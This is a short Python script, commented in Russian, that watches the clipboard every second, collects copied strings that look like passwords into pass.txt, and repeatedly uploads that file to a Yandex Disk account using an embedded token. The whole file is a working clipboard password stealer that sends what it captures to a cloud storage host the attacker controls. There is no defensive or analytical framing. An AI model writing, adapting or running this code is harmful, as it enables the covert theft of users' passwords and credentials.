import pyperclip, time, yadisk

#ключи для проверки пароль это ли
keys = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
special = '1234567890-_!@?'

count = 1
check = ""
pas = ""
old = ""

#Конект к Яндекс Диску
tok = "TOKEN YANDEX DISK"
y = yadisk.YaDisk(token = tok)

while True:
    s = pyperclip.paste()

    """
    Проверка чтобы запись новой перменной из буфера не сопадала с прошлой, после чего происходят проверки с ключами и соответсвенная запись
    в файл, а при наборе 5 потенцианальных паролей, они отправляются на Я.Диск
    """
    
    if (s != old):
        for i in s:
            if i in keys:
                check = s             
        
        for k in check:
            if k in special:
                pas = check

                with open("pass.txt", "a", encoding="UTF-8") as f:
                    f.write(f"{pas}\n")
                    count += 1
                    if count == 5:
                        try:
                            y.upload("pass.txt", "/pass.txt")
                            print("отправил")
                            count = 0
                        except:
                            y.remove("pass.txt")
                            y.upload("pass.txt", "/pass.txt")
                            print("отправил")
                            count = 0
                    
                    break
            
        old = s

    time.sleep(1)
